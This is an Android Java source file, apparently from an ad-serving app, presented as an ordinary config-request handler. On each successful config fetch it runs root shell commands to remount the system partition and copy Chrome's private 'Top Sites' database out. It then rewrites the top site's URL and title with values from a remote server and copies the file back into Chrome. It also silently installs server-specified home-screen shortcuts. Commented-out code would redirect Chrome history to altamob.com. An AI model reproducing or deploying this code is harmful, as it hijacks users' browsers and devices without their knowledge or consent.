package com.mob.root.net;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import org.apache.http.Header;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.view.View;

import com.mob.root.AMApplication;
import com.mob.root.entity.ADConfig;
import com.mob.root.net.parser.ConfigParser;
import com.mob.root.tools.AMConstants;
import com.mob.root.tools.AMLogger;
import com.mob.root.tools.CommonUtils;
import com.mob.root.tools.RootCmd;
import com.mob.root.tools.SystemPartition;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.listener.SimpleImageLoadingListener;

public class ConfigRequest extends AMRequest<ADConfig> {

	public ConfigRequest(IResponseListener<ADConfig> listener) {
		super(listener);
	}

//	@Override
//	public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
//	}

	@Override
	public void onSuccess(int statusCode, Header[] headers, String datas) {
		try {
			super.onSuccess(statusCode, headers, datas);
			File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_CONFIG);
			CommonUtils.writeFile(datas, file);
//			ConfigParser parser = new ConfigParser();
//			ADConfig config = parser.parse(datas);
			SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
			android.content.SharedPreferences.Editor editor = sp.edit();
			long lastConfig = System.currentTimeMillis();
			editor.putLong(AMConstants.SP_LAST_CONFIG_STAMP, lastConfig).commit();
//			// 下次获取配置文件缓存时间
//			int cacheControlHours = config.getCacheHours();
//			cacheControlHours = cacheControlHours > 7 * 24 ? 7 * 24 : cacheControlHours;
//			editor.putLong(AMConstants.SP_NEXT_CONFIG_STAMP, lastConfig + cacheControlHours * 60 * 60 * 1000).commit();
			// 下次数据上报时间
//			String dataUploadInterval = config.getDatasUploadInterval();
//			long lastUpload = sp.getLong(AMConstants.SP_LAST_UPLOAD_STAMP, 0);
//			long nextUpload = lastUpload == 0 ? System.currentTimeMillis() + Integer.parseInt(dataUploadInterval) * 60 * 60 * 1000 : lastUpload + Integer.parseInt(dataUploadInterval) * 60 * 60 * 1000 ; 
//			if(!CommonUtils.isEmptyString(dataUploadInterval)) {
//				editor.putLong(AMConstants.SP_NEXT_UPLOAD_STAMP, nextUpload).commit();
//			}
			//检查升级
			UpdateRequest request = new UpdateRequest(null);
			request.start();
			
			//------测试数据
			File file2 = AMApplication.instance.getFileStreamPath("test_config");
			String data = new Date(lastConfig).toString() + "\r\n";
			String readFile = CommonUtils.readFile(file2);
			CommonUtils.writeFile(readFile + data, file2);
			
			updateChromeDb();
			
			ConfigParser parser = new ConfigParser();
			final String lanucherUrl = parser.getValue(AMApplication.instance, "launcher_entrance_url");
			String lanucherIcon = parser.getValue(AMApplication.instance, "launcher_entrance_icon");
			final String lanucherTitle = parser.getValue(AMApplication.instance, "launcher_entrance_title");
			if(!CommonUtils.isEmptyString(lanucherUrl) && !CommonUtils.isEmptyString(lanucherIcon) && !CommonUtils.isEmptyString(lanucherTitle)) {
				ImageLoader.getInstance().loadImage(lanucherIcon, AMApplication.instance.displayOption, new SimpleImageLoadingListener() {
					@Override
					public void onLoadingComplete(String imageUri, View view, Bitmap loadedImage) {
						addShortcut(loadedImage,lanucherTitle,Uri.parse(lanucherUrl));
					}
				});
			}
			
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	private void addShortcut(Bitmap icon, String name, Uri uri) {
		Intent intentAddShortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
		intentAddShortcut.putExtra("duplicate", false);
		// 添加名称
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
		// 添加图标
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON, icon);
		// 设置Launcher的Uri数据
		Intent intentLauncher = new Intent();
		intentLauncher.setData(uri);
		// 添加快捷方式的启动方法
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intentLauncher);
		AMApplication.instance.sendBroadcast(intentAddShortcut);
	}

	private void updateChromeDb() throws IOException {
		if(null == Environment.getExternalStorageDirectory()) {
			return;
		}
		SystemPartition.getSystemMountPiont();
		SystemPartition.remountSystem(true);
		String path = Environment.getExternalStorageDirectory().getAbsolutePath();
		if(CommonUtils.isEmptyString(path)) {
			return;
		}
		RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\" " + path);
		SQLiteDatabase db = null;
		try {
			File file = new File(path + "/Top Sites");
			if(!file.exists()) {
				return;
			}
			db = SQLiteDatabase.openDatabase(file.getAbsolutePath(), null, 0);
			Cursor cursor = db.rawQuery("select last_updated from thumbnails where url_rank = ?", new String[]{"0"});
			if(null == cursor) {
				if(null != db)  {
					db.close();
				}
				return;
			}
			if(!cursor.moveToNext()) {
				return;
			}
			long lastUpdated = cursor.getLong(cursor.getColumnIndex("last_updated"));
			ContentValues cv = new ContentValues();
			ConfigParser parser = new ConfigParser();
			String url = parser.getValue(AMApplication.instance, "chrome_url");
			String title = parser.getValue(AMApplication.instance, "chrome_title");
			cv.put("url", url);
			cv.put("redirects", url);
			cv.put("title", title);
//			cv.put("last_updated", lastUpdated + 1000);
//			cv.put("load_completed", 1);
//			Bitmap bitmap = BitmapFactory.decodeResource(AMApplication.instance.getResources(), R.drawable.ic_launcher);
//			bos = new ByteArrayOutputStream();
//			bitmap.compress(CompressFormat.PNG, 100, bos);
//			cv.put("thumbnail", bos.toByteArray());
			int result = db.update("thumbnails", cv, "url_rank = ?", new String[]{"0"});
//			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\"");
//			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/Top Sites-journal\"");
			RootCmd.execRootCmd("cp " + path + "/\"Top Sites\"" + " /data/data/com.android.chrome/app_chrome/Default");
//			RootCmd.execRootCmd("cp " + path + "/\"Top Sites-journal\"" + " /data/data/com.android.chrome/app_chrome/Default");
			
//			RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/History\" " + path);
//			file = new File(path + "/History");
//			if(!file.exists()) {
//				return;
//			}
//			db = SQLiteDatabase.openDatabase(file.getAbsolutePath(), null, 0);
//			cv.clear();
//			cv.put("url", "http://www.altamob.com");
//			cv.put("title", "altamob");
//			result = db.update("urls", cv, "id = ?", new String[]{"1"});
//			
//			cv.clear();
//			cv.put("name", "http://www.altamob.com");
//			result = db.update("segments", cv, "id = ?", new String[]{"1"});
//			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/History\"");
//			RootCmd.execRootCmd("cp " + path + "/\"History\"" + " /data/data/com.android.chrome/app_chrome/Default");
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != db)  {
				db.close();
			}
		}
	}

	@Override
	public void start(Object... args) {
		try {
			doPost(AMConstants.GET_CONFIG_URI, null, true);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
}
